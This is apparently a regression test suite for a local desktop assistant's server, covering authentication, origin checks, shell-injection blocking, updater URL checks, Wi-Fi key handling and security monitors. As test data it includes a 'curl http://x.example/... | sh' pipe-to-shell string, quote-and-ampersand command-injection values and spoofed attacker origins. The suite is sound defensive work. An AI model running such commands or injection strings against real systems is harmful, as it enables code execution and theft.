"""Phase 0 regression tests: crashes, auth, shell access, privacy, honesty, Wi-Fi.

Run:  python -m unittest tests.test_phase0 -v   (from the repository root)

Boots the real server in-process against a throwaway profile. Side effects are
stubbed: no speech, no browser, no AI calls, no update downloads. Nothing here
reads a real Wi-Fi key: netsh is always faked.
"""
import ast
import http.client
import json
import os
import re
import socket
import subprocess
import sys
import tempfile
import threading
import time
import unittest
import webbrowser
from unittest import mock

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
APP = os.path.join(ROOT, "app")

_home = tempfile.mkdtemp(prefix="kalki_test_")
for _k in ("HOME", "APPDATA", "LOCALAPPDATA", "USERPROFILE"):
    os.environ[_k] = _home
os.environ["KALKI_TEST"] = "1"
sys.path.insert(0, APP)
os.chdir(APP)
webbrowser.open = lambda *a, **k: True

with socket.socket() as _s:
    _s.bind(("127.0.0.1", 0))
    PORT = _s.getsockname()[1]

import config  # noqa: E402

config.PORT = PORT
config.GREET_ON_START = False
config.AUTO_IP_LOCATION = False
config.TELEGRAM_BOT_TOKEN = ""
config.VISION_RECALL_ENABLED = False
config.TELEMETRY_ENABLED = False

import core.updater as updater  # noqa: E402

_real_daemon = updater.start_update_daemon
updater.start_update_daemon = lambda *a, **k: None

import server  # noqa: E402

server.speak = lambda *a, **k: None
server.ask_ai = lambda *a, **k: "stub reply"
server.ask_ai_stream = lambda *a, **k: iter(["stub ", "reply"])

TOKEN_HEADER = server.runtime_security.TOKEN_HEADER
TOKEN = server.runtime_security.get_api_token()
AUTH = {TOKEN_HEADER: TOKEN}
OK_ORIGIN = f"http://127.0.0.1:{PORT}"


def request(method, path, body=None, headers=None, raw=None, host=None):
    conn = http.client.HTTPConnection("127.0.0.1", PORT, timeout=30)
    data = raw if raw is not None else (json.dumps(body).encode() if body is not None else None)
    conn.putrequest(method, path, skip_host=True, skip_accept_encoding=True)
    conn.putheader("Host", host or f"127.0.0.1:{PORT}")
    for key, value in (headers or {}).items():
        conn.putheader(key, value)
    if data is not None:
        conn.putheader("Content-Length", str(len(data)))
    conn.endheaders(data)
    resp = conn.getresponse()
    text = resp.read().decode("utf-8", "replace")
    conn.close()
    return resp.status, dict(resp.getheaders()), text


def setUpModule():
    threading.Thread(target=server.main, daemon=True).start()
    for _ in range(120):
        try:
            if request("GET", "/api/health")[0] == 200:
                return
        except OSError:
            pass
        time.sleep(0.25)
    raise RuntimeError("server did not start")


class Crashes(unittest.TestCase):
    """Routes that returned 500 from shadowed function-local imports."""

    def test_status_ok(self):
        self.assertEqual(request("GET", "/api/status", headers=AUTH)[0], 200)

    def test_chat_stream_ok(self):
        msgs = [{"role": "user", "content": "explain gravity"}]
        status, _, text = request("POST", "/api/chat", {"messages": msgs, "stream": True}, AUTH)
        self.assertEqual(status, 200, text[:200])
        self.assertIn("stub", text)

    def test_chat_plain_ok(self):
        msgs = [{"role": "user", "content": "explain gravity"}]
        status, _, text = request("POST", "/api/chat", {"messages": msgs}, AUTH)
        self.assertEqual(status, 200, text[:200])

    def test_approvals_and_report_ok(self):
        self.assertEqual(request("POST", "/api/approvals/list", {}, AUTH)[0], 200)
        body = {"prompt": "a", "response": "b", "reason": "other"}
        self.assertEqual(request("POST", "/api/report", body, AUTH)[0], 200)

    def test_pet_page_serves_html_and_session(self):
        status, headers, text = request("GET", "/pet")
        self.assertEqual(status, 200)
        self.assertIn("<", text[:40])
        self.assertNotIn('"ok": false', text[:80])
        self.assertIn(server.runtime_security.TOKEN_COOKIE, headers.get("Set-Cookie", ""))
        self.assertIn("HttpOnly", headers.get("Set-Cookie", ""))

    def test_pet_overlay_status_ok(self):
        self.assertEqual(request("GET", "/api/pet/overlay", headers=AUTH)[0], 200)

    def test_calendar_tools_reach_their_code(self):
        for name in ("get_calendar_events", "create_calendar_event", "delete_calendar_event"):
            self.assertNotIn("not associated with a value", server.execute_tool_call(name, "{}"))

    def test_open_app_tool_reaches_its_code(self):
        with mock.patch.object(server, "ask_native_permission", return_value=True), \
                mock.patch.object(os, "startfile", side_effect=FileNotFoundError("nope"), create=True):
            reply = server.execute_tool_call("system_control", json.dumps({"action": "open_app", "target": "x"}))
        self.assertNotIn("not associated with a value", reply)

    def test_non_object_json_body_is_a_400(self):
        status, _, _ = request("POST", "/api/tasks/list", headers=AUTH, raw=b"[1]")
        self.assertEqual(status, 400)

    def test_auth_logout_rotates_token(self):
        self.assertTrue(callable(getattr(server.runtime_security, "rotate_auth_token", None)))


class Auth(unittest.TestCase):
    def test_no_route_skips_the_token(self):
        for path in ("/api/pet", "/api/wake", "/api/chat", "/api/command"):
            self.assertEqual(request("POST", path, {"cmd": ""})[0], 401, path)

    def test_pet_state_requires_auth(self):
        self.assertEqual(request("GET", "/api/pet")[0], 401)

    def test_foreign_origins_rejected_even_with_token(self):
        origins = ("null", "https://evil.example", "http://localhost:3000", f"http://localhost.evil.example:{PORT}")
        for origin in origins:
            status = request("POST", "/api/tasks/list", {}, {**AUTH, "Origin": origin})[0]
            self.assertEqual(status, 403, origin)
            self.assertEqual(request("GET", "/api/status", headers={**AUTH, "Origin": origin})[0], 403, origin)

    def test_own_origin_allowed(self):
        for origin in (OK_ORIGIN, f"http://localhost:{PORT}"):
            self.assertEqual(request("POST", "/api/tasks/list", {}, {**AUTH, "Origin": origin})[0], 200, origin)

    def test_foreign_host_rejected_and_gets_no_session(self):
        for host in (f"evil.example:{PORT}", "127.0.0.1:1", "localhost"):
            status, headers, _ = request("GET", "/", host=host)
            self.assertEqual(status, 403, host)
            self.assertNotIn("Set-Cookie", headers)

    def test_session_cookie_from_home_page_works(self):
        _, headers, _ = request("GET", "/")
        cookie = headers["Set-Cookie"].split(";")[0]
        self.assertEqual(request("GET", "/api/status", headers={"Cookie": cookie})[0], 200)

    def test_telegram_sends_the_token(self):
        import core.telegram_mod as tg
        self.assertEqual(tg._kalki_headers()[TOKEN_HEADER], TOKEN)

    def test_pet_bridge_sends_the_token(self):
        src = open(os.path.join(APP, "desktop_pet.py"), encoding="utf-8").read()
        self.assertIn("TOKEN_HEADER", src)


class ShellAccess(unittest.TestCase):
    def _no_process(self, text):
        with mock.patch.object(subprocess, "run") as run, mock.patch.object(subprocess, "Popen") as popen:
            result = server.handle_local(text)
        self.assertFalse(run.called, text)
        self.assertFalse(popen.called, text)
        return result

    def test_chat_text_never_reaches_a_shell(self):
        for text in ("run echo PWNED", "exec echo PWNED", "terminal echo PWNED",
                     "powershell echo PWNED", "run a marathon plan for me"):
            handled, reply = self._no_process(text)
            self.assertNotIn("Executed System Command", reply or "")

    def test_api_command_cannot_run_a_shell_even_with_token(self):
        status, _, text = request("POST", "/api/command", {"cmd": "run echo KALKI_POC_OK"}, AUTH)
        self.assertEqual(status, 200)
        self.assertNotIn("Executed System Command", text)

    def test_open_app_never_passes_metacharacters(self):
        with mock.patch.object(os, "startfile", side_effect=FileNotFoundError("x"), create=True) as start:
            self._no_process('open foo" & calc & "')
        self.assertFalse(start.called)

    def test_open_unknown_app_falls_back_without_crashing(self):
        with mock.patch.object(os, "startfile", side_effect=FileNotFoundError("x"), create=True):
            handled, reply = self._no_process("open zzqqxxapp")
        self.assertTrue(handled)
        self.assertIn("zzqqxxapp", reply)

    def test_no_string_shell_commands_with_dynamic_text(self):
        """f-strings handed to a shell are how injection happens."""
        offenders = []
        for name in ("server.py", "main_app.py", "workflows.py"):
            path = os.path.join(APP, name)
            tree = ast.parse(open(path, encoding="utf-8", errors="replace").read())
            for node in ast.walk(tree):
                if isinstance(node, ast.Call) and node.args and isinstance(node.args[0], ast.JoinedStr):
                    if any(k.arg == "shell" and getattr(k.value, "value", False) is True for k in node.keywords):
                        offenders.append(f"{name}:{node.lineno}")
        self.assertEqual(offenders, [])

    def test_ai_cannot_create_a_routine_with_a_raw_command(self):
        args = {"name": "x", "actions": [["run_cmd", "calc"]]}
        reply = server.execute_tool_call("create_routine", json.dumps(args))
        self.assertIn("not allowed", reply.lower())

    def test_config_file_not_readable_through_file_api(self):
        status, _, _ = request("POST", "/api/system/files/read", {"path": os.path.join(APP, "config.py")}, AUTH)
        self.assertEqual(status, 403)

    def test_approval_prompt_fails_closed(self):
        import ctypes
        with mock.patch.object(ctypes, "windll", create=True, new=None):
            self.assertFalse(server.ask_native_permission("do a thing", always=True))


class Location(unittest.TestCase):
    def test_no_lookup_unless_opted_in(self):
        from core import location_provider as lp
        with mock.patch("urllib.request.urlopen", side_effect=AssertionError("network")), \
                mock.patch.object(subprocess, "run", side_effect=AssertionError("gps")), \
                mock.patch.object(config, "OWNER_CITY", "YourCity"), \
                mock.patch.object(config, "AUTO_IP_LOCATION", False):
            result = lp.get_resolved_location()
        self.assertNotEqual(result.get("city"), "Ahmedabad")

    def test_ip_lookup_uses_https(self):
        src = open(os.path.join(APP, "core", "location_provider.py"), encoding="utf-8").read()
        self.assertNotIn("http://", src)


class Updater(unittest.TestCase):
    def test_url_check_is_exact(self):
        good = f"https://github.com/{updater.REPO}/releases/download/v9.0.0/KALKI_Setup_v9.0.0.exe"
        self.assertTrue(updater.is_trusted_download_url(good))
        for bad in ("https://evil.example/github.com/x.exe",
                    "https://github.com.evil.example/x.exe",
                    "http://github.com/" + updater.REPO + "/releases/download/v9/x.exe",
                    "https://github.com/someone/else/releases/download/v9/x.exe"):
            self.assertFalse(updater.is_trusted_download_url(bad), bad)

    def test_daemon_never_downloads_by_itself(self):
        info = {"url": "https://github.com/x", "digest": "", "name": "x"}
        with mock.patch.object(updater, "check_for_updates", return_value=(True, "v9.9.9", info)), \
                mock.patch.object(updater, "download_and_run_update") as dl, \
                mock.patch.object(updater, "IS_RELEASE_BUILD", True):
            _real_daemon(ROOT)
            time.sleep(0.4)
        self.assertFalse(dl.called)
        self.assertEqual(updater.STATE_UPDATE_AVAILABLE.get("version"), "v9.9.9")
        updater.STATE_UPDATE_AVAILABLE.clear()


class ScanHonesty(unittest.TestCase):
    def test_unreadable_file_is_not_clean(self):
        import antivirus
        missing = antivirus.scan_file(os.path.join(_home, "missing.bin"))
        self.assertFalse(missing["clean"])
        self.assertEqual(missing["scan_status"], "not_scanned")
        with mock.patch("builtins.open", side_effect=PermissionError("locked")):
            locked = antivirus.scan_file(__file__)
        self.assertFalse(locked["clean"])
        self.assertEqual(locked["scan_status"], "not_scanned")

    def test_not_protected_unless_defender_confirms(self):
        import antivirus
        for defender, expected in (
            ({"available": False}, False),
            ({"available": True, "antivirus_enabled": True, "realtime_enabled": False}, False),
            ({"available": True, "antivirus_enabled": True, "realtime_enabled": True}, True),
        ):
            with mock.patch.object(antivirus, "get_windows_defender_status", return_value=defender):
                self.assertEqual(antivirus.get_antivirus_status()["system_protected"], expected, defender)

    def test_kalki_port_is_not_a_mining_port(self):
        import antivirus
        self.assertNotIn(8888, antivirus.MINING_PORTS)


PROFILE_XML = """<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
  <name>{name}</name>
  <SSIDConfig><SSID><name>{name}</name></SSID><nonBroadcast>{hidden}</nonBroadcast></SSIDConfig>
  <connectionType>ESS</connectionType>
  <connectionMode>{mode}</connectionMode>
  <MSM><security>
    <authEncryption><authentication>{auth}</authentication><encryption>{enc}</encryption></authEncryption>
    {shared}
  </security></MSM>
</WLANProfile>"""


def _xml(name, auth="WPA2PSK", enc="AES", mode="auto", hidden="false", key=None, protected="false"):
    shared = ""
    if key is not None:
        shared = (f"<sharedKey><keyType>passPhrase</keyType><protected>{protected}</protected>"
                  f"<keyMaterial>{key}</keyMaterial></sharedKey>")
    return PROFILE_XML.format(name=name, auth=auth, enc=enc, mode=mode, hidden=hidden, shared=shared)


class WifiParsing(unittest.TestCase):
    def setUp(self):
        import wifi_security
        self.wifi = wifi_security

    def test_profile_xml_parsing(self):
        p = self.wifi.parse_profile_xml(_xml("Home Net", key="correct horse", mode="manual"))
        self.assertEqual(p["ssid"], "Home Net")
        self.assertEqual(p["authentication"], "WPA2PSK")
        self.assertFalse(p["auto_connect"])
        self.assertEqual(p["key"], "correct horse")

    def test_risk_ratings(self):
        rate = lambda a, e: self.wifi.assess_profile({"authentication": a, "encryption": e, "auto_connect": False, "hidden": False})["risk"]
        self.assertEqual(rate("open", "none"), "high")
        self.assertEqual(rate("open", "WEP"), "critical")
        self.assertEqual(rate("WPAPSK", "TKIP"), "high")
        self.assertEqual(rate("WPA2PSK", "TKIP"), "high")
        self.assertEqual(rate("WPA2PSK", "AES"), "ok")
        self.assertEqual(rate("WPA3SAE", "AES"), "good")

    def test_auto_connect_to_open_network_is_called_out(self):
        result = self.wifi.assess_profile({"authentication": "open", "encryption": "none", "auto_connect": True, "hidden": False})
        self.assertTrue(any("automatic" in f.lower() for f in result["findings"]))

    def test_password_strength_never_echoes_the_key(self):
        rating = self.wifi.rate_password("password123")
        self.assertEqual(rating["strength"], "weak")
        self.assertNotIn("password123", json.dumps(rating))
        self.assertEqual(self.wifi.rate_password("Tr0ub4dor&3-horse-staple-92")["strength"], "strong")

    def test_nearby_parsing_and_impostor_detection(self):
        output = (
            "Interface name : Wi-Fi\nThere are 2 networks currently visible.\n\n"
            "SSID 1 : Home Net\n    Network type            : Infrastructure\n"
            "    Authentication          : Open\n    Encryption              : None\n"
            "    BSSID 1                 : aa:bb:cc:dd:ee:ff\n         Signal             : 88%\n"
            "         Radio type         : 802.11ax\n         Channel            : 36\n\n"
            "SSID 2 : Cafe\n    Network type            : Infrastructure\n"
            "    Authentication          : WPA2-Personal\n    Encryption              : CCMP\n"
            "    BSSID 1                 : 11:22:33:44:55:66\n         Signal             : 40%\n"
            "    BSSID 2                 : 11:22:33:44:55:77\n         Signal             : 30%\n"
        )
        nets = self.wifi.parse_nearby(output)
        self.assertEqual([n["ssid"] for n in nets], ["Home Net", "Cafe"])
        self.assertEqual(nets[1]["best_signal"], 40)
        self.assertEqual(len(nets[1]["bssids"]), 2)
        saved = [{"ssid": "Home Net", "authentication": "WPA2PSK", "encryption": "AES"}]
        flagged = self.wifi.find_impostors(nets, saved)
        self.assertEqual([f["ssid"] for f in flagged], ["Home Net"])

    def test_location_block_is_explained(self):
        msg = ("Network shell commands need location permission to access WLAN. "
               "Turn on location services on the Location page in Privacy & security settings.")
        with mock.patch.object(self.wifi, "_netsh", return_value=(1, msg)), \
                mock.patch.object(self.wifi, "is_supported", return_value=True):
            result = self.wifi.scan_nearby()
        self.assertFalse(result["ok"])
        self.assertEqual(result["kind"], "location_required")

    def test_interface_parsing(self):
        output = ("    Name                   : Wi-Fi\n    State                  : connected\n"
                  "    SSID                   : Home Net\n    AP BSSID               : aa:bb:cc:dd:ee:ff\n"
                  "    Authentication         : WPA2-Personal\n    Cipher                 : CCMP\n"
                  "    Radio type             : 802.11ax\n    Channel                : 36\n    Signal                 : 91%\n")
        info = self.wifi.parse_interface(output)
        self.assertEqual(info["ssid"], "Home Net")
        self.assertEqual(info["signal"], 91)
        self.assertTrue(info["connected"])

    def test_export_cleans_up_plaintext_keys(self):
        made = []

        def fake(args, timeout=15):
            folder = next(a.split("=", 1)[1] for a in args if a.startswith("folder="))
            made.append(folder)
            with open(os.path.join(folder, "Wi-Fi-Home.xml"), "w", encoding="utf-8") as f:
                f.write(_xml("Home", key="secret-key-value"))
            return 0, "ok"

        with mock.patch.object(self.wifi, "_netsh", side_effect=fake):
            profiles = self.wifi.export_profiles(with_keys=True)
        self.assertEqual(profiles[0]["key"], "secret-key-value")
        self.assertFalse(os.path.exists(made[0]))

    def test_unknown_network_cannot_be_acted_on(self):
        with mock.patch.object(self.wifi, "is_supported", return_value=True), \
                mock.patch.object(self.wifi, "export_profiles", return_value=[{"ssid": "Home"}]), \
                mock.patch.object(self.wifi, "_netsh") as netsh:
            self.assertFalse(self.wifi.forget_network('x" name="Home')["ok"])
            self.assertFalse(netsh.called)

    def test_key_protected_means_admin_needed(self):
        with mock.patch.object(self.wifi, "is_supported", return_value=True), \
                mock.patch.object(self.wifi, "export_profiles", return_value=[{"ssid": "Home", "key": "ab12", "key_protected": True}]):
            result = self.wifi.reveal_password("Home")
        self.assertFalse(result["ok"])
        self.assertEqual(result["kind"], "needs_admin")


class WifiApi(unittest.TestCase):
    def setUp(self):
        import wifi_security
        self.wifi = wifi_security

    def test_routes_require_auth(self):
        for route in ("overview", "nearby", "reveal", "audit", "forget", "autoconnect"):
            self.assertEqual(request("POST", f"/api/wifi/{route}", {})[0], 401, route)

    def test_reveal_denied_returns_no_key(self):
        with mock.patch.object(server, "ask_native_permission", return_value=False), \
                mock.patch.object(self.wifi, "reveal_password", return_value={"ok": True, "password": "topsecret"}) as rev:
            status, _, text = request("POST", "/api/wifi/reveal", {"ssid": "Home"}, AUTH)
        self.assertEqual(status, 403)
        self.assertNotIn("topsecret", text)
        self.assertFalse(rev.called)

    def test_client_cannot_self_approve(self):
        with mock.patch.object(server, "ask_native_permission", return_value=False) as ask, \
                mock.patch.object(self.wifi, "forget_network") as forget:
            request("POST", "/api/wifi/forget", {"ssid": "Home", "confirmed": True}, AUTH)
        self.assertTrue(ask.called)
        self.assertFalse(forget.called)

    def test_reveal_approved_returns_key_and_logs_without_it(self):
        with mock.patch.object(server, "ask_native_permission", return_value=True), \
                mock.patch.object(self.wifi, "reveal_password", return_value={"ok": True, "ssid": "Home", "password": "topsecret"}):
            status, _, text = request("POST", "/api/wifi/reveal", {"ssid": "Home"}, AUTH)
        self.assertEqual(status, 200)
        self.assertIn("topsecret", text)
        self.assertEqual(request("POST", "/api/activity/list", {}, AUTH)[0], 200)
        self.assertNotIn("topsecret", json.dumps([a["action"] for a in server._activity_log]))

    def test_audit_never_returns_keys(self):
        profiles = [{"ssid": "Home", "key": "password123", "key_protected": False,
                     "authentication": "WPA2PSK", "encryption": "AES"}]
        with mock.patch.object(server, "ask_native_permission", return_value=True), \
                mock.patch.object(self.wifi, "is_supported", return_value=True), \
                mock.patch.object(self.wifi, "export_profiles", return_value=profiles):
            status, _, text = request("POST", "/api/wifi/audit", {}, AUTH)
        self.assertEqual(status, 200)
        self.assertNotIn("password123", text)
        self.assertIn("weak", text)

    def test_voice_password_command_needs_approval_and_never_speaks_it(self):
        with mock.patch.object(server, "ask_native_permission", return_value=False), \
                mock.patch.object(self.wifi, "reveal_password", return_value={"ok": True, "ssid": "Home", "password": "topsecret"}) as rev:
            handled, reply = server.handle_local("wifi password Home")
        self.assertTrue(handled)
        self.assertFalse(rev.called)
        self.assertNotIn("topsecret", reply)


class ShieldMonitors(unittest.TestCase):
    def setUp(self):
        import shield_monitors
        self.m = shield_monitors

    def test_new_download_is_scanned_once(self):
        folder = tempfile.mkdtemp(dir=_home)
        old = os.path.join(folder, "old.exe")
        open(old, "w").close()
        watcher = self.m.DownloadWatcher(folder, settle_seconds=0)
        watcher.poll()
        new = os.path.join(folder, "new.exe")
        with open(new, "w") as f:
            f.write("x")
        with mock.patch("antivirus.scan_file", return_value={"clean": True, "scan_status": "scanned"}) as scan:
            watcher.poll()
            watcher.poll()
        self.assertEqual([c.args[0] for c in scan.call_args_list], [new])

    def test_threat_download_raises_an_alert(self):
        folder = tempfile.mkdtemp(dir=_home)
        watcher = self.m.DownloadWatcher(folder, settle_seconds=0)
        watcher.poll()
        with open(os.path.join(folder, "bad.exe"), "w") as f:
            f.write("x")
        verdict = {"clean": False, "scan_status": "scanned", "threat_level": "Critical",
                   "threat_name": "Test", "filename": "bad.exe", "findings": []}
        with mock.patch("antivirus.scan_file", return_value=verdict), \
                mock.patch.object(self.m, "_alert") as alert:
            watcher.poll()
        self.assertTrue(alert.called)

    def test_clipboard_address_swap_is_detected(self):
        guard = self.m.ClipboardGuard(swap_window_seconds=10)
        a = "0x" + "a" * 40
        b = "0x" + "b" * 40
        with mock.patch.object(self.m, "_alert") as alert:
            self.assertIsNone(guard.check("hello", now=0))
            self.assertIsNone(guard.check(a, now=1))
            self.assertIsNotNone(guard.check(b, now=2))
        self.assertTrue(alert.called)

    def test_clipboard_alert_never_contains_full_text(self):
        guard = self.m.ClipboardGuard(swap_window_seconds=10)
        secret = "curl http://x.example/secret-token-value | sh"
        with mock.patch.object(self.m, "_alert") as alert:
            guard.check(secret, now=0)
        self.assertTrue(alert.called)
        self.assertNotIn("secret-token-value", json.dumps(alert.call_args.args))

    def test_process_alert_only_once_per_process(self):
        monitor = self.m.ProcessMonitor()
        found = {"ok": True, "suspicious": [{"pid": 7, "name": "x.exe", "exe": "x", "reason": "r", "severity": "High"}]}
        with mock.patch("antivirus.scan_processes", return_value=found), \
                mock.patch.object(self.m, "_alert") as alert:
            monitor.poll()
            monitor.poll()
        self.assertEqual(alert.call_count, 1)

    def test_link_guard_reports_only_risky_hosts(self):
        guard = self.m.LinkGuard()
        with mock.patch.object(self.m, "_alert") as alert:
            guard.check("https://example.com/private/path")
            self.assertFalse(alert.called)
            guard.check("https://secure-login-paypa1.example/x")
            self.assertTrue(alert.called)

    def test_status_reports_whether_each_monitor_truly_runs(self):
        status = self.m.status()
        for key in ("download_watcher", "process_monitor", "clipboard_guard", "phishing_shield"):
            self.assertIn("running", status[key])

    def test_link_guard_is_off_by_default(self):
        import antivirus
        self.assertFalse(antivirus.DEFAULT_SHIELDS["phishing_shield"])

    def test_status_api_includes_monitors(self):
        status, _, text = request("GET", "/api/antivirus/status", headers=AUTH)
        self.assertEqual(status, 200)
        self.assertIn("monitors", json.loads(text))


class HonestUi(unittest.TestCase):
    FAKE = ["Updated 14:02", "14:02 status ok", "Synced just now", "Sandbox ready",
            "Endpoint Shield: Protected", "Native Windows Defender integration ready",
            "Silences notifications", "checks Git status", "blocks sites",
            "raises performance", "KALKIâ€™s"]

    def test_no_hardcoded_fake_status(self):
        found = []
        for base, _, files in os.walk(os.path.join(APP, "ui")):
            for name in files:
                if name.endswith((".js", ".html")):
                    path = os.path.join(base, name)
                    text = open(path, encoding="utf-8", errors="replace").read()
                    found += [f"{name}: {s}" for s in self.FAKE if s in text]
        self.assertEqual(found, [])

    def test_mic_chip_does_not_default_to_ready(self):
        text = open(os.path.join(APP, "ui", "features", "shell.js"), encoding="utf-8", errors="replace").read()
        self.assertNotIn("id: 'mic' }, 'Mic ready'", text)

    def test_status_reports_listener_liveness(self):
        data = json.loads(request("GET", "/api/status", headers=AUTH)[2])
        self.assertIn("listenerOnline", data)
        self.assertFalse(data["listenerOnline"])
        request("GET", "/api/status?client=listener", headers=AUTH)
        self.assertTrue(json.loads(request("GET", "/api/status", headers=AUTH)[2])["listenerOnline"])

    def test_placeholder_github_token_is_not_connected(self):
        with mock.patch.object(config, "GITHUB_TOKEN", "your_personal_access_token"):
            data = json.loads(request("GET", "/api/status", headers=AUTH)[2])
        self.assertFalse(data["githubConfigured"])

    def test_briefing_and_skills_answer_get(self):
        self.assertNotEqual(request("GET", "/api/briefing/get", headers=AUTH)[0], 404)
        self.assertEqual(request("GET", "/api/skills/list", headers=AUTH)[0], 200)

    def test_wifi_tab_is_wired(self):
        text = open(os.path.join(APP, "ui", "features", "security.js"), encoding="utf-8", errors="replace").read()
        self.assertIn("renderWifi", text)


def _local_import_problems(path):
    """Names bound by a function-level import but used where that binding may not
    have run. Python treats them as local to the WHOLE function, so such a use
    raises UnboundLocalError. Ruff's F823 misses the conditional cases."""
    tree = ast.parse(open(path, encoding="utf-8", errors="replace").read())
    problems = []

    def always_runs_after(node):
        return isinstance(node, ast.Try) and all(
            h.body and isinstance(h.body[-1], (ast.Return, ast.Raise, ast.Continue, ast.Break))
            for h in node.handlers)

    for fn in ast.walk(tree):
        if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
            continue
        binds, uses = {}, {}

        def walk(node, conds):
            for child in ast.iter_child_nodes(node):
                if isinstance(child, (ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda, ast.ClassDef)):
                    continue
                next_conds = conds
                if isinstance(child, (ast.If, ast.For, ast.While, ast.Try)) and not always_runs_after(child):
                    next_conds = conds + [child]
                if isinstance(child, ast.Import):
                    for a in child.names:
                        binds.setdefault((a.asname or a.name).split(".")[0], []).append((child.lineno, conds))
                elif isinstance(child, ast.ImportFrom):
                    for a in child.names:
                        binds.setdefault(a.asname or a.name, []).append((child.lineno, conds))
                elif isinstance(child, ast.Name) and isinstance(child.ctx, ast.Load):
                    uses.setdefault(child.id, []).append(child.lineno)
                walk(child, next_conds)

        walk(fn, [])
        for name, bound in binds.items():
            for line in uses.get(name, []):
                safe = False
                for at, conds in bound:
                    if at <= line and (not conds or conds[-1].lineno <= line <= conds[-1].end_lineno):
                        safe = True
                        break
                if not safe:
                    problems.append(f"{os.path.basename(path)}:{line} {fn.name}: '{name}'")
    return problems


class StaticSafety(unittest.TestCase):
    def _files(self):
        for folder in (APP, os.path.join(APP, "core")):
            for name in sorted(os.listdir(folder)):
                if name.endswith(".py") and name != "config.py":
                    yield os.path.join(folder, name)

    def test_no_shadowed_local_imports(self):
        problems = []
        for path in self._files():
            problems += _local_import_problems(path)
        self.assertEqual(problems, [])

    def test_runtime_security_attributes_exist(self):
        import runtime_security
        src = open(os.path.join(APP, "server.py"), encoding="utf-8", errors="replace").read()
        for attr in set(re.findall(r"runtime_security\.(\w+)", src)):
            self.assertTrue(hasattr(runtime_security, attr), attr)


if __name__ == "__main__":
    unittest.main(verbosity=2)
